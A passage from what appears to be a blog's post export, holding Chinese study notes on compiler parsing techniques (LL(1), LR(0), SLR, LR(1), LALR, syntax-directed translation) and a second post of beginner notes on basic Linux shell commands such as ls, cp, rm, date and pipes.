它表明当用非终结符A向下推导而当前输入符为a时，所应采用的候选式。当矩阵元素为空时，则表示用A往下推导时遇到了不应该出现的符号，即A与a不能匹配。因此应该转向出错处理。 预测分析程序如下图 ①判断文法G[E]是否为LL(1)文法，若文法中含有左递归那么要先消除左递归，然后求select集 ②构造预测分析表，对每个终结符或’#’号用a表示，则若a∈Select(A&rarr;α)。令 M[A,a]=A&rarr;α 把所有无定义的M[A,a]标上ERROR 伪代码如下： 12345678910111213141516171819其程序维护一个栈Stack用来储存非终结符，一个用于储存源程序的读入字符变量a，一个用于储存栈顶元素XX其中M[A,a] = &#123;X-&gt;x1x2……xk&#125; 为 Select(X-&gt;x1x2……xk)=&#123;a,……&#125;,X为非终结符,a为终结符#和开始符合入栈把第一个输入符号读入aFlag := Truewhile Flag Do: 把栈顶元素出栈到X中 if X ∈ VT then if X = a then 把下一个输入符号读入a else ERROR else if X = &apos;#&apos; then Flag := False else ERROR else if M[X,a] = &#123;X-&gt;x1x2x3……Xxk&#125; then 把x1x2x3……xk入栈 else ERROREND of whileSTOP/*分析成功，过程完毕*/ 自底向上语法分析原理：自左向右扫描，自下而上分析 从输入符号串入手，通过反复查找当前句型的可归约串，并使用文法的产生式把他归约成相应的非终结符来一步步地进行分析。最终把输入串归约成文法的开始符号，表明分析成功。 任何自下而上分析方法的关键就是要找出当前句型的可归约串，然后根据产生式判别将它归约成什么样的非终结符。 规范归约基本概念G为文法，S为开始符号，假定α，β，δ是G的一个句型，如果 S =*=&gt; αAδ 且 A=+=&gt; β， 则称 β 是句型 α β δ 相对于非终结符A的短语。 如果 A &rArr; β ，则称β是句型 α β δ 相对于A的直接短语。 最左直接短语称为句柄。 从句子到开始符号的归约序列，如果每一步都是把句柄替换为相应产生式的左部符号而得到的，则称为规范归约。规范归约是最右推导（规范推导）的逆过程。 例：：考虑文法G(E)：E→E +T |T T→T*F | F F→i| (E) 并假定输入串为（i+i)*i，考察自下而上的分析过程 栈上的候选式不一定是句柄。例如，在第14步对栈顶为T，它是E的一候选式，但它不是句柄，不能归约成E。判定候选式是极为简单的事情，但判定句柄就不那么容易。而不同的自底向上方法给出不同的判定方法。 自下而上方法包括四个方法： 移进(shift)：把输入流的头符读到分析栈中 归约(Reduction)：把分析栈顶的句柄归约为一非终结符 接受：分析成功 报错：处理错误 算符优先分析首先规定文法符号之间的优先关系和结合性质，然后再利用这种关系，通过比较两个相邻的符号之间的优先顺序来确定可归约串。 算符文法：任何产生式的右部都不含两个相继的非终结符 优先关系： 终结符ab的三种优先关系： a = b：当且仅当存在形如下面的产生式 U &rarr; … ab … 或 U &rarr; …aQb … a &lt; b：当且仅当存在形如下面的产生式 U &rarr; …aW… 的产生式，且有 W =+=&gt; b… a &gt; b：当且仅当存在形如下面的产生式 U &rarr; …Vb… 的产生式，且有 V=+=&gt;…a 或 V =*=&gt;…aQ 如何从文法构造优先关系表检查文法产生式的每个候选，可找出所有满足 = 的终结符对。 对于每个非终结符 P 构造两个集合 FIRSTVT(P) 和 LASTVT(P) FisrtVt(P) = { a | P =+=&gt; a… 或 P =+=&gt; Qa… ，a ∈ VT ，Q ∈ VN } LastVt(P) = { a | P =+=&gt; …a 或 P =+=&gt; …aQ ，a∈VT ，Q ∈ VN } 检查每个产生式的候选，若形如 …aP… ，则对任意b ∈ FisrtVt(P) ，我们有 a&lt;b 若形如 …Pb… ，则对任何a ∈ LastVt(P)，我们有 a&gt;b 对表达式文法的非终结符构造 FirstVt 和 LastVt 并建立优先关系表 算符优先分析算法素短语：这样的一个短语，他至少包含一个终结符，不含比自身更小的素短语 最左素短语：句型最左边的素短语 定理：算法优先文法的句型 #N1a1N2a2……NnanNn+1# 的最左素短语是满足如下条件的最左子串 Njaj……NiaiNi+1 ， aj-1 &lt; aj ， aj = aj+1 = ai ， ai &gt; ai+1 优先函数LR分析法 LR(K)分析是指自左向右扫描和自下而上的语法分析，且在分析的每一步，只须根据分析栈中当前已移进和归约出的全部文法符号，并至多再向前查看K个输入符号，就能确定相当于某一产生式右部符号的句柄是否已在分析栈的顶部形成。从而也就可以确定所应采取的分析动作（是移进输入符号还是按某产生式进行归约）。 1234567891011# X1X2 …… Xi …… Xn Xn+1 Xn+2 …… Xn+k Xn+k+1 …… # |-------||----------------| 栈顶 扫描器的缓冲区 扫到Xn+1,向前查看k个符号,来确定是把Xn+1移进栈,还是把Xi…Xn作为句柄进行归约1) 要归约时，则根据某产生式 U → XiXi+1……Xn 进行归约: #X1X2 …… Xi-1 U Xn+1Xn+2 …… Xn+k …… #2)要移进时，即把Xn+1进栈，并读入下一符号: #X1X2 …… Xi …… XnXn+1 Xn+2 …… Xn+k …… # |---| |---| |-| 栈中Xi 栈顶(Xn+1) 当前扫描符(Xn+2) LR(0)：表示再每一步分析时都不用向前输入符号 LR(1)：表示再每一步分析时都向前看一个输入符号来决定当前的动作 SLR(1)：表示简单的LR(1)，即只在动作不唯一的地方向前看一个符号，在动作唯一时则不向前看输入符号 LR分析器的逻辑结构及工作流程 如图为LR分析器的逻辑结构，所有LR分析器的总控程序大致相同，只有分析表（即Go-Action表）不相同。 规范LR分析表构造法：用此法构造的分析表功能最强而且也适合很多文法，但是实现代价较高 简单LR（即SLR）分析表构造法：比较容易实现的方法，但SLR分析表功能太弱，而且对某些文法可能根本就构造不出相应的SLR分析表 向前LR（即LALR）分析表构造法：这种方法构造的分析表功能介于规范LR分析表和SLR分析表之间。这种表适用于绝大多数的程序语言文法，而且也可以设法有效实现 LR的分析过程两个栈：状态栈，符号栈 移进： 归约： 接受&amp;报错： 所以各种LR分析器的最大区别在于其分析表，分析表决定了每一步该如何移进或者归约，直至接受，或者中途报错。 LR(0)分析表的构造1.规范句型的活前缀 前缀：一个符号串的前缀是指该串的任意首部(包括ε)。 ​ 例：abc的前缀为：ε，a，ab，abc 归约时，归约前和归约后的被归约部分与剩余部分合起来仅构成文法的规范句型，而用哪个产生式归约仅取决于当前句型的前面部分；X1X2…Xn[p]，其中Xi为文法的符号，[p]为第p个产生式序号 我们把规范句型的这种前端部分的串称为活前缀。实际上，它们恰好是符号栈栈顶形成句柄时符号栈中的内容。 活前缀：是指规范句型的一个前缀，这种前缀不含句柄之后的任何符号。 这是因为一旦句型的句柄在符号栈顶形成，将会立即被归约之故。所以我们将规范句型具有上述性质（不含句柄之后的任何符号）的前缀称之为活前缀。 在规范归约过程中的任何时候只要已分析过的部分即在符号栈中的符号串为规范句型的活前缀，表明输入串的已被分析过的部分是该文法某规范句型的一个正确部分。 定义：若 S=*R&rArr; αAω =R&rArr; αβω 是文法G的一个规范推导，如果符号串γ是 αβ 的前缀，则称γ是G的一个活前缀。其中S为文法开始符号 LR(0)项目 活前缀和句柄间的关系： (1) 活前缀中已含有句柄的全部符合（句柄的最后符号就是活前缀的最后符号） (2) 活前缀只含有句柄的前部分符号（句柄的最左子串为活前缀的最右子串） (3) 活前缀中全然不包括句柄的任何符号 (1) 表明：此时某一产生式 A &rarr; β 的右部 β 已出现在符号栈顶，因此此时相应的分析动作应当是用此产生式进行归约。 (2) 表明：形如 A &rarr; β1 β2 的产生式的右部子串已在符号栈栈顶了，如 β1 ，正期待着从余留输入串中能看到由β推出的符号串，即期待 β2 进栈以便能进行归约。故此时分析动作是移进当前输入符号 (3) 表明：期望从余留输入串中能看到某产生式 A &rarr; α 的右部，即α所代表的符号串（即句柄），所以此时分析的动作也是读输入符进符号栈。 在产生式的右部相应位置上加一个圆点 . ，来指示识别位置，标明在 . 前的部分已被识别 如 (1) A &rarr; β. (2) A &rarr; β1.β2 (3) A &rarr; .α 右部某位置上标有圆点的产生式称为LR(0)项目(item)。 不同的LR(0)项目，反映了分析过程中符号栈顶的不同情况。 每个项目的意义与圆点的位置有关 圆点左边的子串表示在分析过程的某一时刻用该产生式归约时句柄中已识别过的部分，圆点右边的子串表示待识别的部分 文法的全部LR(0)项目将是构造他的所有活前缀的有穷自动机的基础 LR(0)项目的分类 A → α.：表明右部符号串已出现在栈顶，此时相应的分析动作应当是按此产生式进行归约，此种项目称为规约项目。 S&#39; → S.：称为接受项目。 A → α.Xβ：其中α可以为ε，当X为终结符时，相应的分析动作应将当前的符号移入栈中，将此项目称为移进项目。 A → α.Xβ：其中α可以为ε，当X为非终结符时，期待从余留的输入符中进行归约后而得到X，此类项目称为待约项目。 把终结符和非终结符都可看成一个有限自动机的输入符号，每把一个符号进栈相当于已识别过该符号，而状态进行转换（到下一个状态），当识别到可归约前缀时相当于栈顶已形成句柄，则认为达到了识别句柄的终态。、 ==&gt;&gt;&gt;构造识别活前缀的DFA：DFA中的每一个状态由若干个LR(0)项目所组成的集合(称为项目集)来表示。 12345678910举例：构造识别前缀的DFA用I0表示这个DFA的初态，将项目S&apos;→.S列入项目集I0。将项目S→.A和S→.B加入I0中。将A→.aAb和A→.c和B→.aBb, B→.d加入I0中。项目集I0将由如下项目组成：I0 : S&apos;→.S, S→.A, S→.B, A→.aAb, A→.c, B→.aBd, B→.d&gt;&gt;&gt; S&apos;→.S称为项目集I0的基本项目，从基本项目出发构造项目集I0的过程，可用closure(&#123;S&apos;→.S&#125;)表示。 closure(I)的定义:Closure(I) = I ∪ { A → .μ | A → μ∈G ∧ K→ α.Aβ∈closure(I) ∧ α∈V∧β∈V} 构造closure(I)的算法:1）I 中的每一个项目都属于 closure(I)2）若形如 K→α.Aβ 的项目属于I，且 A→μ 是文法的一个产生式，任何形如 A→.μ 的项目也应加到 closure(I) 中3）重复上述过程，直至不再有新的项目加入到closure(I)中为止。 如何确定从I0可能转移到的下一状态？ 若I0中有项目 K→a .Ab，从输入串识别出A后，进入下一状态。设此状态为 Ii ，显然 Ii 中必含有形如 K→aA .b 的项目，称为 K→a .Ab 的后继项目。后继项目组成集合 J，则J中的每个项目都是项目集 Ii 的基本项目，有： Ii =closure( J ) 定义状态转移函数：GOTO(I,A)=closure(J)其中，I 是当前状态，A为文法符号，J 是 I 中所有形如K→a.Ab的项目之后继项目K→aA.b所组成的集合，而closure(J)就是项目集 I（即状态I)关于符号A的后继项目集（即后继状态）。 将G[S’]的全部项目集称为文法G[S’]的LR(0)项目集规范族，并记为C=(I0 ，I1 ，I2 ，……，In ) 识别文法G[S’]的全部活前缀的DFA为 M = ( C，V，GoTo ， I0 ， Z ) 其中，C：M的状态集，即文法G[S’] 的LR(0) 项目集规范族 I0 ~~~ In V：M的字母表，即在M中的所有符号 GoTo：M的状态转换函数，即上述的GoTo函数 I0 ：M的唯一初态 Z：M的终态集，Z &sub; C 为规范族中所有含有规约项目的那些项目集 例如下图： 12345678文法G&apos;:(0) S&apos; → S(1) S → A(2) S → B(3) A → aAb(4) A → c(5) B → aBd(6) B → d 如上为一个DFA，通过读入字符进行状态转换，以及在每个状态内进行closure闭包。 LR(0)分析表构造要求每一个项目集中的的诸项目不出现下列的情况： （1）移进项目和归约项目并存，即存在移进—归约冲突； （2）多个归约项目并存，即存在归约—归约冲突。 ​ 如果一个文法G满足上述条件，也就是它的每个LR(0)项目集中都不含有冲突的项目，则称G为LR(0)文法。 只有当一个文法是LR(0)文法时，才能对它构造不含冲突动作的LR(0)分析表。 1234567891011121314151617181920212223242526构造LR(0)分析表的算法为： (1)对于每一项目集Ii中形如A→α.Xβ的项目，且有GO(Ii,X)=Ij, 若X为一终结符号 a 时，则置ACTION[i,a]=Sj; 若X为一非终结符号时，则置GOTO[i,X]=j (2)若Ii中有归约项目A→α. ,设A→α为文法第j个产生式，则对文法的任何终结符和“#”（均记为a）,置ACTION[i,a]=Rj (3)若接受项目S&apos;→S .属于Ii ,则置ACTION[i,#]=acc。 (4)在分析表中,凡不能按上述规则填入信息的元素,均置为“出错”。 如上图的DFA可构造分析表为: ACTION GOTO a b c d # S A B0 S4 S5 S6 1 2 31 Acc2 R1 R1 R1 R1 R13 R2 R2 R2 R2 R24 S4 S5 S6 7 95 R4 R4 R4 R4 R46 R6 R6 R6 R6 R67 S88 R3 R3 R3 R3 R39 S1010 R5 R5 R5 R5 R5&gt;&gt;&gt; 表中Ri代表用第i个产生式归约,Si代表移进Action表的第i行 分析器的工作过程如下： 根据输入串当前符号 a 和 分析栈栈顶状态 i 查找分析表应采取的动作： 1）若ACTION[i,a]=Sj, a∈VT ,则把 a 移进符号栈， j 移进状态栈。 2）若ACTION[i,a]=Rj，a∈VT 或 # ，则用第j个产生式归约。并将两个栈的指针减去K(其中，K为第j 个产生式右部的串长度），并把产生式的左部符号A压入符号栈，同时用符号对（ Si-k , A )去查GOTO表（其中Si-k 为状态栈当前栈顶元素，若 GOTO[Si-k ,A] = j ,则j压入状态栈，使得两个栈内的元素一样多。 3）若ACTION[i,a]=Acc,（此时a应为“#”号），则表明分析成功，结束分析。 4）若ACTION[i,a]=空白，转出错处理。 SLR分析表构造大多数程序设计语言的文法不是LR(0)文法。 对LR(0)规范族中有冲突的项目集（状态）用向前查 看一个（输入）符号的办法进行处理，以解决冲突。即为SLR(1)。 SLR(1) 分析表构造与LR(0) 分析表构造基本相同 SLR(1) 之所以是1，是因为向前看了一步Follow集。 12345678910111213假定有一个LR(0)规范族中含有如下项目集(状态)I:I=&#123;X→a.bβ , A→g. , B→d.&#125;其中a,b,g,d为符号串，b∈VT ,I中含有移进—归约和归约—归约冲突。只要FOLLOW(A)和FOLLOW(B)互不相交，且都不包含b,即:FOLLOW(A)∩FOLLOW(B)=φFOLLOW(A)∩&#123;b&#125;=φFOLLOW(B)∩&#123;b&#125;=φ当状态I面临某输入符号a时，则动作为：1）若a = b,则移进。2）若a ∈ FOLLOW(A),则用产生式A→g归约。3）若a ∈ FOLLOW(B),则用产生式B→d归约。 一般地，对于LR(0)规范族的一个项目集I可能含有多个移进项目和多个归约项目，我们可假设项目集I中有m个移进项目： A1→a1. b1b1, A2→ a2. b2b2, …, Am→ am. bmbm;同时含有n个归约项目：B1→g1. , B2→ g2. ,…, Bn→ gn. ,只要集合{b1, b2,…bm}和FOLLOW(B1),FOLLOW(B2),…,FOLLOW(Bn) 两两交集都为空，则我们仍可用上述归则来解决冲突： 1）若a∈{b1, b2,…,bm},则移进。 2）若a∈FOLLOW(Bi),i=1,…,n，则用 Bi→ gi 进行归约。 3）此外，则报错。 SLR分析表构造方法(1) 对于每一项目集Ii中形如A.X的项目，且有GOTO(Ii,X)=Ij, 若X为一终结符号a时，则置ACTION[I,a]=S; 若X为一非终结符号时，则仅置GOTO[i,X]=j； (2) 若归约项目A→α. 属于Ii,设A→α为文法第j个行产生式，则对任何属于FOLLOW(A)的输入符号a,置ACTION[i,a]=Rj； (3) 若接受项目S’ → S.属于Ii ,则置ACTION[i,#]=acc。 (4) 在分析表,凡不能按上述规则填入信息的元素,均置为“出错”。 （例：TODO：后面补充，ppt–Bottom-Up–P42-47） 规范LR分析表构造SLR(1) 方法：若状态K含有 A ➡ α.，若 α ∈ Follow(A) ，则用 A ➡ α. 归约 当状态Ix下，有产生式A ➡ α. 和A ➡ α. = …，此时，SLR(0)不知道是将此归约成A还是移进至=，若没有其他情况能产生=，则这里产生移进归约冲突，导致错误！！！ LR(1)项目(A→a. β，x) 表示： a在栈顶，输入串头部可由βx导出。 LR(1)的状态：LR(1)项目的集合 12345678910111213141516该算法为: 令初态: Closure( (S’→.S，#) ) Closure(I)= repeat for any item( A→α.Xβ ，z) in I for any production X →γ for any w∈FIRST(βz) I←I∪&#123;X → .γ, w&#125; until I does not changeGO (I,X)= J ←&#123;&#125; for any item(A→α.Xβ，z) in I add ( A→αX.β，z ) to J return Closure(J) LALR分析表的构造同心项目集：除去搜索符之外都相同的LR(1)项目集 合并同心项目集不会产生新的移进-归约冲突 将 LR(1) 合并同心项目集，如果没有归约-归约冲突，则为LALR(1)文法。 参考，各语法分析器的区别 各文法的区别： LL(1)就是向前只搜索1个符号，即与FIRST()匹配，如果FIRST为空则还要考虑Follow集 >&gt;&gt;见到First集就移进，见到Follow集就归约。 LR(0):见到First集就移进，见到终态就归约 SLR(1)见到First集就移进，见到终态先看Follow集，与Follow集对应的项目归约，其它报错。 >&gt;&gt;SLR分析法包含的展望信息是体现在利用了Follow(A)信息，可以解决“归约－归约”冲突 SLR分析法没有包含足够的展望信息，不能完成解决“移进－归约”冲突，需要改进。 LALR同心集合并不会产生“移进－归约”冲突 ，但会产生“归约－归约”冲突 LR(1) 语法制导的翻译（Syntax-Directed Translation）一种语义描述方法：语法制导的翻译 语法制导翻译采用上下文无关文法来引导对语言的翻译，是一种面向文法的翻译技术 语法制导翻译=语法分析+语义分析+中间代码生成 语义翻译 = 语义分析 + 中间代码生成 属性文法如何表示语义信息？为文法符号设置语义属性，用来表示语法成分对应的语义信息。 语法制导定义：是对上下文无关文法的推广，将每个文法符号和一个语义属性集合相关联，将每个产生式和一组语义规则相关联，这些用于计算该产生式中各文法符号的属性值 属性文法定义的形式 基础文法 每个文法符号有一组属性 每个文法产生式 A ➡ α 有一组形式为 b := f(c1,c2,……,ck) 的语义规则，其中 f 是函数，b和c1,c2,……,ck是该产生式文法符号的属性 综合属性：如果b是A的属性，c1,c2……,ck是产生式右部文法符号的属性或A的其他属性 继承属性：如果b是产生式右部某个文法符号X的属性 文法符号的属性分为：综合属性和继承属性。 综合属性（Synthesized Attribute）S属性定义：仅仅使用综合属性的语法制导定义 例： 语法分析树如下 分析树的各节点属性的计算自下而上完成 继承属性（Inherited Attribute）例：语法规则如下： 分析树如下： 分析树的依赖图如下 其中，L ➡ L1 ，id ； L1.in := L.in；addtype(id.entry , L.in)； 基于属性文法的处理方法属性计算次序拓扑排序：节点的一种顺序，是的边只会从该次序中先出现的节点到后出现的节点 ①构造输入的分析树，②构造属性依赖图，③对节点进行拓扑排序，④按拓扑排序的次序计算属性。 当然，也可以多次扫描分析树，如果属性文法不存在循环依赖，每次至少会计算出一个属性值，但是编译更偏向于一边扫描的处理方法。 抽象语法树 语法分析与语义处理阶段分离 语法分析树不适合语义处理的因素： 提取公共左因子 消除左递归等引入新的产生式和符号、标点等语法要素不含任何语义信息 抽象语法树是语法分析和后续阶段的接口 S属性文法的自下而上的计算将LR分析器增加一个域来保存综合属性值 L属性文法的自上而下的计算 —边分析边翻译的方式能否用于继承属性 属性的计算次序一定受分析方法所限定的分析树结点建立次序的限制 分析树的节点是自左向右生成 如果属性信息是自左向右流动，那么有可能在分析的同时完成属性计算。 L属性的定义如果每个产生式 A ➡ X1X2…Xn 的每条语义规则计算的属性是A的综合属性；或者Xj (1≤j≤n)的继承属性，但他仅依赖①该产生式中Xj 左边符号 X1X2…Xj-1 的属性；②A的继承属性 变量类型声明的语法制导定义是一个L属性定义 翻译方案，例：把有加减的中缀表达式翻译成后缀表达式，如果是8+5-2，则输出8 5 + 2 - 12345678910E ➡ T RR ➡ addop T &#123;print(addop.lexeme)&#125; R1 | εT ➡ num &#123;print(num.val)&#125;如 8+5-2可翻译成: E ⇒ T R ⇒ num &#123;print (8)&#125; R ⇒ num&#123;print (8)&#125;addop T&#123;print (+)&#125;R ⇒ num&#123;print(8)&#125;addop num&#123;print(5)&#125;&#123;print (+)&#125;R … &#123;print(8)&#125;&#123;print(5)&#125;&#123;print(+)&#125;addop T&#123;print(-)&#125; R … &#123;print(8)&#125;&#123;print(5)&#125;&#123;print(+)&#125;&#123;print(2)&#125;&#123;print(-)&#125; 预测翻译器的设计把预测分析器的构造方法推广到翻译方案的实现 12345678910如:产生式R ➡ +TR | ε 的分析过程procedure R; begin if lookahead = &apos;+&apos; then begin match (&apos;+&apos;);T;R; end else begin /*Do nothing*/ endend 语义规则的两种描述方法：属性文法和翻译方案 S属性的自下而上计算（边分析便计算） L属性的自上而下计算（边分析便计算） L属性的自下而上计算（边分析便计算） 中间代码生成代码优化代码改进变换的原则 （1）等价原则。经过优化后不应改变程序运行的结果。 （2）有效原则。使优化后所产生的目标代码运行时间较短，占用的存储空间较小。 （3）合算原则。应尽可能以较低的代价取得较好的优化效果。 优化：①公共子表达式删除②复写传播③死代码删除④代码外提⑤强度削弱和归纳变量删除 基本块：连续的语句序列，控制流从他的开始进入，并从他的末尾离开]]></content>
      <categories>
        <category>Compiler</category>
      </categories>
      <tags>
        <tag>StudyNote</tag>
        <tag>Compilier</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux Note]]></title>
    <url>%2F2019%2F08%2F22%2FLinux-Command%2F</url>
    <content type="text"><![CDATA[Linux Study Note 参考： 黑马程序员-linux从入门到精通 Linux系统的文件linux一切皆文件 文件操作种类：创建文件、编辑文件、保存文件、关闭文件、重命名文件、删除文件、恢复文件 文件目录结构Bin：全称binary，含义是二进制。该目录中存储的都是一些二进制文件，文件都是可以被运行的。 Dev：该目录中主要存放的是外接设备，例如盘、其他的光盘等。在其中的外接设备是不能直接被使用的，需要挂载（类似windows下的分配盘符。 Etc：该目录主要存储一些配置文件。 Home：表示“家”，表示除了root用户以外其他用户的家目录，类似于windows下的User/用户目录。 Proc：process，表示进程，该目录中存储的是Linux运行时候的进程。 Root：该目录是root用户自己的家目录。 Sbin：全称super binary，该目录也是存储一些可以被执行的二进制文件，但是必须得有super权限的用户才能执行。 Tmp：表示“临时”的，当系统运行时候产生的临时文件会在这个目录存着。 Usr：全称是User Software Resource，注意不是user的缩写。存放的是用户自己安装的软件。类似于windows下的program files。 Var：存放的程序/系统的日志文件的目录。 Mnt：当外接设备需要挂载的时候，就需要挂载到mnt目录下。 Linux的基本指令linux指令指在linux终端（命令行）中输入的内容。 一个完整的指令的标准格式：Linux通用的格式 1#指令主体 (空格) [选项] (空格) [操作对象] 一个指令可以包含多个选项，操作对象也可以是多个。 1.ls指令含义：ls（list） 用法1：#ls含义：列出当前工作目录下的所有文件/文件夹的名称 用法2：#ls 路径含义：列出指定路径下的所有文件/文件夹的名称 路径分为相对路径和绝对路径 用法3：#ls 选项 路径含义：在列出指定路径下的文件/文件夹的名称，并以指定的格式进行显示。 常见的语法： 12#ls -l 路径#ls -la 路径 选项解释： ​ -l：表示list，表示以详细列表的形式进行展示 ​ -a：表示all，显示所有的文件/文件夹（包含了隐藏文件/文件夹） 上述列表中的第一列表示文档类型，其中 “ - ” 表示改行对应的文档类型为文件，“ d ” 表示文档类型为文件夹。 在Linux中，隐藏文档一般以 “ . ” 开头。 用法4：#ls -lh 路径含义：列出指定路径下的所有文件/文件夹的名称，以列表的形式并且在显示文档大小的时候以可读性较高的形式显示 ls列出的结果颜色说明，其中蓝色的名称表示文件夹，黑色的表示文件，绿色的其权限为拥有所有权限 2.pwd指令用法：#pwd （print working directory，打印当前工作目录） 3.cd指令命令：#cd （change directory，改变目录） 作用：用于切换当前的工作目录 语法：#cd 路径P.S. 在linux中有一个特殊符号~，用于表示当前用户的家目录 4.mkdir指令指令：mkdir （make directory，创建目录） 语法1：#mkdir 路径路径，可以是文件夹名称也可以是包含名称的一个完整路径 假如是文件夹名称，则在当前目录下创建该文件夹 语法2：#mkdir -p 路径含义：当一次性创建多层不存在的目录的时候，添加-p参数，否则会报错 语法3：#mkdir 路径1 路径2 路径3 …表示一次性创建多个目录 5.touch指令作用：创建文件 语法：#touch 文件路径 路径可以是直接的文件名也可以是路径 一次性创建多个文件 6.cp指令指令含义：cp （copy，复制） 作用：复制文件/文件夹到指定位置 语法：#cp 被复制的文档路径 文档被复制到的路径简单来说就是#cp 源地址 目的地址 注意：Linux在复制过程中是可以重新对新位置的文件进行重命名的，但是如果不是必须的需要，则建议保持前后名称一致。 当使用cp命令进行文件夹复制操作的时候需要添加选项“-r”（-r表示递归复制），否则目录将被忽略 7.mv指令指令含义：mv （move，移动，剪切） 作用：移动文档到新的位置 语法：#mv 需要移动的文件路径 需要保存的位置路径 注：在Linux中重命名的命令也是mv，语法和移动语法一样。 8.rm指令指令含义：rm （remove，移除，删除） 语法：#rm 选项 需要移除的文件路径选项： -f：force，强制删除，不提示是否删除 ​ -r：表示递归 在删除的时候如果不带选项，会提示是否删除，如果需要确认则输入“y/yes”，否则输入 注意：如果在删除的时候不想频繁的确认，则可以在指令中添加选项“-f”，表示force（强制）。 删除一个文件夹： 注意：删除一个目录的时候需要做递归删除，并且一般也不需要进行删除确认询问，所以移除目录的时候一般需要使用-rf选项。 删除多个文件： 删除一个目录下具有公共特性的文件，例如都以Linux开头 其中*称之为通配符，意思表示任意的字符，Linux*，则表示只要文件以Linux开头，后续字符则不管。 9.vim指令指令：vim （Vim是一款文本编辑器，号称编辑器之神） 语法：#vim 文件路径作用：可以打开一个文件，文件不存在时，可以创建该文件 vim其他用法参考本文后续。 10.输出重定向一般命令的输出都会显示在终端中，有些时候需要将一些命令的执行结果想要保存到文件中进行后续的分析/统计，则这时候需要使用到的输出重定向技术。 >：覆输出，会覆盖掉原先的文件内容 >&gt;：追加输出，不会覆盖原始文件内容，会在原始内容末尾继续添加 语法：#正常执行的指令 &gt; / &gt;&gt;文件的路径注意：文件可以不存在，不存在则新建 11.cat指令作用1：cat有直接打开一个文件的功能。 语法1：#cat 文件的路径 作用2：cat还可以对文件惊醒合并 语法2：#cat 待合并的文件路径1 待合并的文件路径2 … 文件路径n &gt; 合并之后的文件路径 12.df指令作用：查看磁盘空间 语法：#df -h-h表示以较高可读性的形式展示大小 13.free指令作用：查看内存使用情况 语法：#free -m-m表示以mb为单位查看 剩余的真实可用的内存为1665mb。 Swap：用于临时内存，当系统真实内存不够用的时候可以临时使用磁盘空间来充当内存。 14.head指令作用：查看一个文件的前n行，若不指定n，则默认显示前10行。 语法：#head -n 文件路径n表示数字 15.tail指令作用1：查看一个文件的末n行，如果n不指定，则默认显示后10行 语法：#tail -n 文件路径n表示数字 作用2：可以通过tail指令来查看一个文件的动态变化内容（变化的内容不能是用户手动添加的） 语法：#tail -f 文件路径该命令一般用于查看系统的日志比较多 16.less指令作用：查看文件，以较少的内容进行输出，按下辅助功能键（数字+回车，空格键+上下方向键）查看更多 语法：#less 需要查看的文件路径 退出的时候只需要按下q键 17.wc指令作用：统计文件内容信息（包含行数、单词数、字节数） 语法：#wc -lwc 需要统计的文件路径-l：表示lines，行数 -w：表示words，单词数，依照空格来判断单词数量 -c：表示bytes，字节数 18.date指令作用：表示操作时间日期（读取、设置） 语法1：#date输出的形式：2019年8月24日 星期六 20:13:14 语法2：#date +%F （等价于 #date “+%Y-%m-%d”）输出形式：2019-08-24 语法3：#date “+%F %T” （等价于 #date “+%Y-%m-%d %H:%M:%S”）引号表示让“年月日与时分秒”成为一个不可分割的整体 输出的形式：2019-08-24 20:13:14 语法4：#date -d “-1 day” “+%Y-%m-%d %H:%M:%S”用于获取之前或者之后的某个时间（备份） 符号的可选值：+（之后）、-（之前） 单位的可选值：day（天）、month（月份）、year（年）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162%F：表示完整的年月日%T：表示完整的时分秒%Y：表示四位年份%m：表示两位月份（带前导0）%d：表示日期（带前导0）%H：表示小时（带前导0）%M：表示分钟（带前导0）%S：表示秒数（带前导0）(以下摘自#date --help) %% 一个文字的 % %a 当前locale 的星期名缩写(例如： 日，代表星期日) %A 当前locale 的星期名全称 (如：星期日) %b 当前locale 的月名缩写 (如：一，代表一月) %B 当前locale 的月名全称 (如：一月) %c 当前locale 的日期和时间 (如：2005年3月3日 星期四 23:05:25) %C 世纪；比如 %Y，通常为省略当前年份的后两位数字(例如：20) %d 按月计的日期(例如：01) %D 按月计的日期；等于%m/%d/%y %e 按月计的日期，添加空格，等于%_d %F 完整日期格式，等价于 %Y-%m-%d %g ISO-8601 格式年份的最后两位 (参见%G) %G ISO-8601 格式年份 (参见%V)，一般只和 %V 结合使用 %h 等于%b %H 小时(00-23) %I 小时(00-12) %j 按年计的日期(001-366) %k hour, space padded ( 0..23); same as %_H %l hour, space padded ( 1..12); same as %_I %m month (01..12) %M minute (00..59) %n 换行 %N 纳秒(000000000-999999999) %p 当前locale 下的"上午"或者"下午"，未知时输出为空 %P 与%p 类似，但是输出小写字母 %r 当前locale 下的 12 小时时钟时间 (如：11:11:04 下午) %R 24 小时时间的时和分，等价于 %H:%M %s 自UTC 时间 1970-01-01 00:00:00 以来所经过的秒数 %S 秒(00-60) %t 输出制表符 Tab %T 时间，等于%H:%M:%S %u 星期，1 代表星期一 %U 一年中的第几周，以周日为每星期第一天(00-53) %V ISO-8601 格式规范下的一年中第几周，以周一为每星期第一天(01-53) %w 一星期中的第几日(0-6)，0 代表周一 %W 一年中的第几周，以周一为每星期第一天(00-53) %x 当前locale 下的日期描述 (如：12/31/99) %X 当前locale 下的时间描述 (如：23:13:48) %y 年份最后两位数位 (00-99) %Y 年份 %z +hhmm 数字时区(例如，-0400) %:z +hh:mm 数字时区(例如，-04:00) %::z +hh:mm:ss 数字时区(例如，-04:00:00) %:::z 数字时区带有必要的精度 (例如，-04，+05:30) %Z 按字母表排序的时区缩写 (例如，EDT) 19.cal指令作用：用来操作日历的 语法1：#cal （等价于#cal -l）直接输出当前月份日历 语法2：#cal -3表示输出上一个月+本月+下个月的日历 语法3：#cal -y 年份表示输出某一个年份的日历 20.clear | (ctrl+L) 指令作用：清除终端中已经存在的命令和结果（信息） 语法：#clear 或 快捷键 ctrl + L注意：该命令并不是真的清除了之前的信息，而是把之前的信息都隐藏到了最上面，可以通过滚动条继续查看以前的信息。 21.管道pipe管道符： |作用：管道一般可以用于“过滤”，“特殊”，“扩展处理” 语法：管道不能单独使用，必须需要配合前面的指令一起使用，起作用主要是辅助作用①过滤案例（高频率使用）：需要通过管道查询出根目录下包含“y”字母的文档名称。 12345#ls | grep y针对上面这个命令说明：①以管道作为分界线，前面的命令有个输出，后面需要先输入，然后再过滤，最后再输出，通俗的讲就是管道前面的输出就是后面指令的输入；②grep指令：主要用于过滤 ②特殊用法案例：通过管道的操作方法来实现less的等价效果（了解） 之前通过less查看一个文件，可以#less 路径 现在通过管道还可以这么：#cat 路径|less 